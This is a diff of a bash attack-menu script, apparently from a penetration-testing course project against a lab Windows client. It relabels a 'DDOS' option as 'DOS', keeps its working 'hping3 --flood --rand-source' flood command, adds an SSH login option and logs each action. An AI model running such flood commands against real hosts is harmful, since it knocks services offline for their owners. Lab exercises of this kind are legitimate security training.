@@ -545,17 +545,30 @@ case $attack in
 			esac			
 		;;
 	7)
-#Part 2: 1.3 Perform a DDOS attack using hping3 on the windows client
+#Part 2: 1.3 Perform a DOS attack using hping3 on the windows client
 		echo ""
-		echo "//Option 7: DDOS attack using hping3 (Windows Client)\\\\"
+		echo "//Option 7: DOS attack using hping3 (Windows Client)\\\\"
 		echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
 		sudo hping3 --flood -p 80 --rand-source "$ip"					#DDOS attack with hping3
 
 #Part 2: 3.4 On attack selection, save it into a log file in /var/log
 #Part 2: 3.5 The log should hold the kind of attack, time of execution and IP addresses
-		echo "$(date) | Attack: DDOS using Hping3 | Target: $ip" >> /var/log/project6wc.log
+		echo "$(date) | Attack: DOS using Hping3 | Target: $ip" >> /var/log/project6wc.log
 		echo "Records saved into /var/log/project6wc.log"
 		;;
+	8)
+  		echo ""
+    	echo "//Option 8: SSH Login"
+    	echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
+
+    	echo "Connecting to SSH..."
+    	read -p "Enter the SSH username: " username
+
+    	ssh "$username@$ip"
+
+    	echo "$(date) | Action: SSH Login | Target: $ip | Username: $username" >> /var/log/project6wc.log
+    	echo "Records saved into /var/log/project6wc.log"
+    	;;
 	*)
 		echo "Invalid choice."											#If anything else was selected, the message "invalid choice" will be displayed
 		exit 1															#Script will terminate with invalid input
